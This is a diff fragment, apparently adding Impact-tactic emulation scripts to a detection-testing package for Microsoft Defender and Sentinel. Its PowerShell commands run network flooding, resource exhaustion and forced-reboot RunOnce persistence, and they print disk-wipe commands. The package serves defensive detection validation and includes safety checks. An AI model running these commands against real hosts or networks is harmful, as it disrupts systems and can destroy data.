+      "command": "Write-Host '[START] T1498 - Network Denial of Service (TCP SYN + UDP flood simulation to TEST-NET only)'; $target = '#{excalibur_impact_dos_target}'; if ($target -notmatch '^(198\\.51\\.100\\.|203\\.0\\.113\\.|192\\.0\\.2\\.)') { Write-Host ('[ERROR] SAFETY CHECK FAILED: target ' + $target + ' is not a TEST-NET IP (RFC 5737). Aborting. Only 198.51.100.x, 203.0.113.x, or 192.0.2.x are permitted.'); exit 1 }; $burstCount = 50; $ports = @(80,443,8080,22,21,3389,1433,8443,53,25); Write-Host ('[INFO] DoS simulation target: ' + $target + ' (TEST-NET RFC 5737 - non-routable) | Burst: ' + $burstCount + ' attempts | Ports: ' + ($ports -join ',')); Write-Host '[INFO] Phase 1/2: TCP SYN flood pattern (parallel connection attempts)'; $startTime = Get-Date; $jobs = @(); $perPort = [math]::Ceiling($burstCount / $ports.Count); foreach ($port in $ports) { for ($i = 0; $i -lt $perPort; $i++) { $j = [System.Threading.Tasks.Task]::Run([System.Func[object]]{ try { $tcp = New-Object System.Net.Sockets.TcpClient; $r = $tcp.BeginConnect($using:target, $port, $null, $null); $r.AsyncWaitHandle.WaitOne(300) | Out-Null; $tcp.Close() } catch {} ; return $null }); $jobs += $j } }; [System.Threading.Tasks.Task]::WaitAll($jobs, 5000) | Out-Null; $elapsed = ((Get-Date) - $startTime).TotalSeconds; Write-Host ('[INFO] TCP SYN burst complete: ' + $jobs.Count + ' attempts to ' + $target + ' in ' + [math]::Round($elapsed,2) + 's (' + [math]::Round($jobs.Count/$elapsed,0) + ' attempts/sec) - high-rate outbound TCP logged by MDE'); Write-Host '[INFO] Phase 2/2: UDP flood pattern (10 UDP sends to random high ports)'; try { $udpClient = New-Object System.Net.Sockets.UdpClient; $udpPayload = [System.Text.Encoding]::ASCII.GetBytes('MorganaDoSSimT1498' + ('x' * 100)); for ($i = 0; $i -lt 10; $i++) { $udpPort = Get-Random -Minimum 10000 -Maximum 65535; try { $udpClient.Send($udpPayload, $udpPayload.Length, $target, $udpPort) | Out-Null } catch {} }; $udpClient.Close(); Write-Host '[INFO] UDP flood pattern: 10 UDP datagrams sent to random high ports on ' + $target } catch { Write-Host ('[INFO] UDP flood: ' + $_.Exception.Message) }; Write-Host '[SUCCESS] T1498 - Network DoS simulation completed. Sentinel target: High-rate outbound TCP SYN burst to single IP across multiple ports (MDE - network DoS behavioral detection)'",
+      "cleanup_command": "Write-Host '[INFO] T1498 cleanup: no artefacts - network connection attempts only'",
+      "detection_rule": "High-rate outbound TCP SYN burst to single IP across multiple ports (network DoS flood pattern)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Impact-T1499-Endpoint Denial of Service",
+      "name": "Excalibur - Impact-T1499-Endpoint Denial of Service",
+      "description": "Simulates endpoint resource exhaustion (Endpoint DoS): (1) CPU stress - spawns 4 parallel thread jobs each running a tight computation loop for 10 seconds, simulating a CPU-based DoS attack; (2) memory exhaustion - allocates a large byte array (configurable, default 512 MB) in managed memory and holds it for 5 seconds, then releases; (3) handles exhaustion simulation via rapid file handle open/close cycles. All stress patterns have hard time limits (max 15 seconds total). This simulates the behavior of malware that deliberately exhausts CPU, RAM, or handles to degrade system performance and disrupt endpoint defenses.",
+      "tactic": "Impact",
+      "tcode": "T1499",
+      "technique_name": "Endpoint Denial of Service",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1499 - Endpoint Denial of Service (CPU + memory + handle exhaustion simulation, 15s max)'; Write-Host '[INFO] Phase 1/3: CPU stress simulation (4 parallel threads, 10 second limit each)'; $cpuStartTime = Get-Date; $cpuJobs = @(); for ($t = 0; $t -lt 4; $t++) { $cpuJobs += [System.Threading.Tasks.Task]::Run([System.Func[long]]{ $end = [DateTime]::UtcNow.AddSeconds(10); $n = 0L; while ([DateTime]::UtcNow -lt $end) { $n += [Math]::Sqrt($n + 1) | [long]; if (($n % 1000000) -eq 0) { [System.Threading.Thread]::Sleep(0) } }; return $n }) }; [System.Threading.Tasks.Task]::WaitAll($cpuJobs, 12000) | Out-Null; $cpuElapsed = ((Get-Date) - $cpuStartTime).TotalSeconds; $totalIterations = ($cpuJobs | ForEach-Object { $_.Result } | Measure-Object -Sum).Sum; Write-Host ('[INFO] CPU stress complete: 4 threads x 10s | ' + [math]::Round($cpuElapsed,1) + 's elapsed | ~' + [math]::Round($totalIterations/1000000,0) + 'M iterations total (high CPU utilization logged by MDE process telemetry)'); Write-Host '[INFO] Phase 2/3: Memory exhaustion simulation (allocate large byte array, hold 5s, release)'; try { $memMb = 256; Write-Host ('[INFO] Allocating ' + $memMb + ' MB...'); $memBlock = New-Object byte[] ($memMb * 1024 * 1024); [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($memBlock); Write-Host ('[INFO] ' + $memMb + ' MB allocated and written. Holding for 5 seconds...'); Start-Sleep 5; $memBlock = $null; [System.GC]::Collect(); Write-Host ('[INFO] Memory released. Peak working set during test logged by MDE process memory telemetry') } catch { Write-Host ('[INFO] Memory allocation: ' + $_.Exception.Message + ' (partial allocation may have been logged)') }; Write-Host '[INFO] Phase 3/3: File handle rapid open/close (handle exhaustion pattern)'; $handleDir = Join-Path $env:TEMP 'morgana-t1499-handles'; New-Item -ItemType Directory -Path $handleDir -Force | Out-Null; $handles = 0; for ($h = 0; $h -lt 200; $h++) { try { $f = [System.IO.File]::Open((Join-Path $handleDir ('h' + $h + '.tmp')), [System.IO.FileMode]::Create); $f.Close(); $handles++ } catch {} }; Remove-Item -Path $handleDir -Recurse -Force -ErrorAction SilentlyContinue; Write-Host ('[INFO] Handle exhaustion pattern: ' + $handles + ' file handles opened and closed (rapid handle churn logged by MDE)'); Write-Host '[SUCCESS] T1499 - Endpoint DoS simulation completed. Sentinel target: High CPU utilization + large memory allocation + rapid handle churn from non-critical process (MDE - endpoint resource exhaustion behavioral detection)'",
+      "cleanup_command": "Remove-Item -Path (Join-Path $env:TEMP 'morgana-t1499-handles') -Recurse -Force -ErrorAction SilentlyContinue; [System.GC]::Collect(); Write-Host '[INFO] T1499 cleanup: temp handles dir removed, GC forced'",
+      "detection_rule": "Sustained high CPU + large memory allocation + rapid handle churn from non-UI process (endpoint DoS)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Impact-T1529-System Shutdown-Reboot",
+      "name": "Excalibur - Impact-T1529-System Shutdown-Reboot",
+      "description": "Simulates system shutdown/reboot impact techniques: (1) invokes shutdown.exe /r /t 120 /c 'Morgana T1529 Impact Simulation' to schedule a reboot in 120 seconds, immediately followed by shutdown.exe /a to abort it (triggers the invocation telemetry without causing a reboot); (2) creates and immediately deletes a RunOnce registry key with shutdown.exe (simulating adversary persistence for forced reboot on next logon); (3) enumerates recent system shutdown events from the Security event log (Event ID 1074). The shutdown.exe /r invocation is a near-universal Impact indicator even when aborted.",
+      "tactic": "Impact",
+      "tcode": "T1529",
+      "technique_name": "System Shutdown/Reboot",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1529 - System Shutdown/Reboot simulation (shutdown.exe /r + immediate /a abort)'; Write-Host '[INFO] Step 1/3: shutdown.exe /r /t 120 (schedule reboot) + immediate /a (abort)'; try { Write-Host '[INFO] Scheduling reboot in 120 seconds (will be aborted immediately)...'; $shutdownResult = & shutdown.exe /r /t 120 /c 'Morgana Excalibur T1529 Impact Simulation - ABORT FOLLOWS' 2>&1; Write-Host ('[INFO] shutdown /r: ' + ($shutdownResult -join ' ').Trim()); Start-Sleep 1; $abortResult = & shutdown.exe /a 2>&1; Write-Host ('[INFO] shutdown /a (abort): ' + ($abortResult -join ' ').Trim() + ' (reboot aborted - invocation was logged by MDE)') } catch { Write-Host ('[INFO] shutdown.exe: ' + $_.Exception.Message) }; Write-Host '[INFO] Step 2/3: RunOnce shutdown.exe key (adversary persistence for forced reboot)'; try { $runOncePath = 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce'; $shutdownCmd = 'shutdown.exe /r /f /t 0 /c \"MorganaT1529SimReboot\"'; Set-ItemProperty -Path $runOncePath -Name 'MorganaShutdownSimT1529' -Value $shutdownCmd -ErrorAction Stop; Write-Host ('[INFO] RunOnce key written: MorganaShutdownSimT1529 = ' + $shutdownCmd + ' (persistence for reboot on next logon - MDE RunOnce write signal)'); Start-Sleep 1; Remove-ItemProperty -Path $runOncePath -Name 'MorganaShutdownSimT1529' -ErrorAction SilentlyContinue; Write-Host '[INFO] RunOnce key removed (immediately after write for safety)' } catch { Write-Host ('[INFO] RunOnce: ' + $_.Exception.Message) }; Write-Host '[INFO] Step 3/3: Event log check for recent shutdown events (Event ID 1074 - shutdown initiator)'; try { $shutdownEvents = Get-WinEvent -FilterHashtable @{ LogName='System'; Id=1074 } -MaxEvents 5 -ErrorAction SilentlyContinue; if ($shutdownEvents) { Write-Host ('[INFO] Recent shutdown events (Event ID 1074):'); $shutdownEvents | ForEach-Object { Write-Host ('    [' + $_.TimeCreated.ToString('yyyy-MM-dd HH:mm:ss') + '] ' + $_.Message.Split([char]10)[0].Trim().Substring(0,[math]::Min(100,$_.Message.Length))) } } else { Write-Host '[INFO] Event ID 1074: no recent shutdown events found' } } catch { Write-Host ('[INFO] Event log: ' + $_.Exception.Message) }; Write-Host '[SUCCESS] T1529 - System shutdown/reboot simulation completed. Sentinel target: shutdown.exe /r invocation + RunOnce shutdown key (MDE - forced shutdown/reboot impact behavioral detection)'",
+      "cleanup_command": "& shutdown.exe /a 2>&1 | Out-Null; Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce' -Name 'MorganaShutdownSimT1529' -ErrorAction SilentlyContinue; Write-Host '[INFO] T1529 cleanup: shutdown aborted (safety), RunOnce key removed'",
+      "detection_rule": "shutdown.exe /r invocation + RunOnce shutdown persistence key (forced shutdown/reboot impact)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Impact-T1561-Disk Wipe",
+      "name": "Excalibur - Impact-T1561-Disk Wipe",
+      "description": "Simulates disk wipe reconnaissance and preparation (T1561.001/T1561.002): enumerates all physical disks and their partition layout via WMI Win32_DiskDrive, Win32_DiskPartition, and Get-Disk; enumerates disk geometry (sector size, total sectors) that adversaries collect before issuing low-level write calls; invokes diskpart.exe in list-only mode (diskpart /s with a list-only script) to enumerate volumes; simulates the format.com invocation pattern via a dry-run with /? flag. NO actual disk writes, partition modification, or data erasure is performed. Physical disk and partition enumeration combined with diskpart invocation are MDE indicators for disk wipe attack preparation.",
+      "tactic": "Impact",
+      "tcode": "T1561",
+      "technique_name": "Disk Wipe",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": ["excalibur_impact_staging_dir"],
+      "command": "Write-Host '[START] T1561 - Disk Wipe simulation (physical disk enumeration + diskpart invocation - NO actual writes)'; Write-Host '[INFO] Step 1/4: Physical disk enumeration (WMI Win32_DiskDrive - attacker target identification)'; try { $disks = Get-WmiObject -Class Win32_DiskDrive -ErrorAction SilentlyContinue; Write-Host ('[INFO] Physical disks found: ' + @($disks).Count); foreach ($disk in $disks) { $sizeGB = [math]::Round($disk.Size/1GB, 1); Write-Host ('    ' + $disk.DeviceID + ' | ' + $sizeGB + ' GB | ' + $disk.Model + ' | Partitions: ' + $disk.Partitions + ' | Interface: ' + $disk.InterfaceType + ' | Media: ' + $disk.MediaType) } } catch { Write-Host ('[INFO] Win32_DiskDrive: ' + $_.Exception.Message) }; Write-Host '[INFO] Step 2/4: Partition layout enumeration (Win32_DiskPartition - sector geometry for wipe targeting)'; try { $partitions = Get-WmiObject -Class Win32_DiskPartition -ErrorAction SilentlyContinue; Write-Host ('[INFO] Partitions found: ' + @($partitions).Count); foreach ($p in $partitions) { Write-Host ('    ' + $p.Name + ' | ' + [math]::Round($p.Size/1GB,1) + ' GB | StartSector: ' + $p.StartingOffset + ' | Bootable: ' + $p.Bootable + ' | Type: ' + $p.Type) } } catch { Write-Host ('[INFO] Win32_DiskPartition: ' + $_.Exception.Message) }; Write-Host '[INFO] Step 3/4: diskpart list volumes (LOLBin invocation - disk wipe preparation signal)'; $stagingDir = [System.Environment]::ExpandEnvironmentVariables('#{excalibur_impact_staging_dir}'); if (-not (Test-Path $stagingDir)) { New-Item -ItemType Directory -Path $stagingDir -Force | Out-Null }; $diskpartScript = Join-Path $stagingDir 'diskpart-list.txt'; [System.IO.File]::WriteAllText($diskpartScript, \"list disk`r`nlist volume`r`nlist partition`r`nexit`r`n\"); try { $dpResult = & diskpart.exe /s $diskpartScript 2>&1; $dpLines = $dpResult | Where-Object { $_ -match '\\S' } | Select-Object -First 20; Write-Host ('[INFO] diskpart /s output (' + @($dpLines).Count + ' lines):'); $dpLines | ForEach-Object { Write-Host ('    ' + $_.Trim()) } } catch { Write-Host ('[INFO] diskpart.exe: ' + $_.Exception.Message) } finally { Remove-Item $diskpartScript -ErrorAction SilentlyContinue }; Write-Host '[INFO] Step 4/4: format.com /? invocation (disk format tool recon - invocation signal only)'; try { $formatHelp = & format.com /? 2>&1 | Select-Object -First 3; Write-Host ('[INFO] format.com /? invoked (format tool presence and invocation logged by MDE)'); Write-Host '[INFO] Simulated destructive commands (NOT executed): format C: /fs:NTFS /q | dd if=/dev/zero of=\\\\.\PhysicalDrive0' } catch { Write-Host ('[INFO] format.com: ' + $_.Exception.Message) }; Write-Host '[SUCCESS] T1561 - Disk wipe simulation completed. Sentinel target: WMI disk enumeration + diskpart.exe /s invocation + format.com invocation (MDE - disk wipe preparation behavioral detection - NO data was erased)'",
+      "cleanup_command": "$stagingDir = [System.Environment]::ExpandEnvironmentVariables('#{excalibur_impact_staging_dir}'); if (Test-Path $stagingDir) { Remove-Item -Path $stagingDir -Recurse -Force -ErrorAction SilentlyContinue }; Write-Host '[INFO] T1561 cleanup: staging dir removed'",
+      "detection_rule": "WMI disk partition enumeration + diskpart.exe /s invocation + format.com invocation (disk wipe preparation)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    }
+  ],
+  "chains": [
+    {
+      "name": "Excalibur - Impact-T1485-Data Destruction",
+      "description": "Emulation chain for T1485: bulk file overwrite with random bytes + rename + delete (wipe pattern). Validates MDE data destruction behavioral detection.",
+      "package": "excalibur",
+      "tcode": "T1485",
+      "tactic": "Impact",
+      "script_refs": ["Excalibur - Impact-T1485-Data Destruction"]
+    },
+    {
+      "name": "Excalibur - Impact-T1486-Data Encrypted for Impact",
+      "description": "Emulation chain for T1486: AES encryption + .encrypted rename + ransom note + RunOnce registry. Validates MDE ransomware behavioral detection.",
+      "package": "excalibur",
+      "tcode": "T1486",
+      "tactic": "Impact",
+      "script_refs": ["Excalibur - Impact-T1486-Data Encrypted for Impact"]
+    },
+    {
+      "name": "Excalibur - Impact-T1489-Service Stop",
+      "description": "Emulation chain for T1489: net.exe stop targeting VSS/WinDefend/BITS/wbengine. Validates MDE pre-ransomware service disruption detection.",
+      "package": "excalibur",
+      "tcode": "T1489",
+      "tactic": "Impact",
+      "script_refs": ["Excalibur - Impact-T1489-Service Stop"]
+    },
+    {
+      "name": "Excalibur - Impact-T1490-Inhibit System Recovery",
+      "description": "Emulation chain for T1490: vssadmin + bcdedit + wbadmin recovery disruption simulation. Validates MDE anti-recovery pre-ransomware detection.",
+      "package": "excalibur",
+      "tcode": "T1490",
+      "tactic": "Impact",
+      "script_refs": ["Excalibur - Impact-T1490-Inhibit System Recovery"]
+    },
+    {
+      "name": "Excalibur - Impact-T1491-Defacement",
+      "description": "Emulation chain for T1491: local HTML defacement + wallpaper registry modification. Validates MDE defacement behavioral detection.",
+      "package": "excalibur",
+      "tcode": "T1491",
+      "tactic": "Impact",
+      "script_refs": ["Excalibur - Impact-T1491-Defacement"]
+    },
+    {
+      "name": "Excalibur - Impact-T1495-Firmware Corruption Recon",
+      "description": "Emulation chain for T1495: UEFI/BIOS enumeration + bcdedit firmware + Secure Boot registry. Validates MDE firmware attack preparation detection.",
+      "package": "excalibur",
+      "tcode": "T1495",
+      "tactic": "Impact",
+      "script_refs": ["Excalibur - Impact-T1495-Firmware Corruption Recon"]
+    },
+    {
+      "name": "Excalibur - Impact-T1498-Network Denial of Service",
+      "description": "Emulation chain for T1498: TCP SYN burst + UDP flood to TEST-NET IP. Validates MDE network DoS behavioral detection. Target MUST remain a TEST-NET IP.",
+      "package": "excalibur",
+      "tcode": "T1498",
+      "tactic": "Impact",
+      "script_refs": ["Excalibur - Impact-T1498-Network Denial of Service"]
+    },
+    {
+      "name": "Excalibur - Impact-T1499-Endpoint Denial of Service",
+      "description": "Emulation chain for T1499: CPU stress (4 threads x 10s) + 256 MB memory allocation + handle churn. Validates MDE endpoint resource exhaustion detection. Hard 15s limit.",
+      "package": "excalibur",
+      "tcode": "T1499",
+      "tactic": "Impact",
+      "script_refs": ["Excalibur - Impact-T1499-Endpoint Denial of Service"]
+    },
+    {
+      "name": "Excalibur - Impact-T1529-System Shutdown-Reboot",
+      "description": "Emulation chain for T1529: shutdown.exe /r + immediate /a abort + RunOnce key. Validates MDE forced shutdown/reboot impact detection.",
+      "package": "excalibur",
+      "tcode": "T1529",
+      "tactic": "Impact",
+      "script_refs": ["Excalibur - Impact-T1529-System Shutdown-Reboot"]
+    },
+    {
+      "name": "Excalibur - Impact-T1561-Disk Wipe",
+      "description": "Emulation chain for T1561: physical disk enumeration + diskpart /s + format.com invocation. Validates MDE disk wipe preparation detection. No actual data erased.",
+      "package": "excalibur",
+      "tcode": "T1561",
+      "tactic": "Impact",
+      "script_refs": ["Excalibur - Impact-T1561-Disk Wipe"]
+    },
+    {
+      "name": "Excalibur - Impact Full Sweep",
+      "description": "Full sweep of all 10 Impact technique emulations. IMPORTANT: T1498 (Network DoS) target tag MUST be a TEST-NET IP (198.51.100.x) - the script has a safety check and will abort if a real IP is set. T1499 (Endpoint DoS) runs a 15-second CPU/memory stress - do not run on production. T1489 (Service Stop) stops and immediately restarts non-critical services (VSS, BITS, wbengine). All file artefacts are auto-cleaned. Recommended: run individual chains first, then Full Sweep.",
+      "package": "excalibur",
+      "tcode": "TA0040",
+      "tactic": "Impact",
+      "script_refs": [
+        "Excalibur - Impact-T1485-Data Destruction",
+        "Excalibur - Impact-T1486-Data Encrypted for Impact",
+        "Excalibur - Impact-T1489-Service Stop",
+        "Excalibur - Impact-T1490-Inhibit System Recovery",
+        "Excalibur - Impact-T1491-Defacement",
+        "Excalibur - Impact-T1495-Firmware Corruption Recon",
+        "Excalibur - Impact-T1498-Network Denial of Service",
+        "Excalibur - Impact-T1499-Endpoint Denial of Service",
+        "Excalibur - Impact-T1529-System Shutdown-Reboot",
+        "Excalibur - Impact-T1561-Disk Wipe"
+      ]
+    }
+  ]
+}
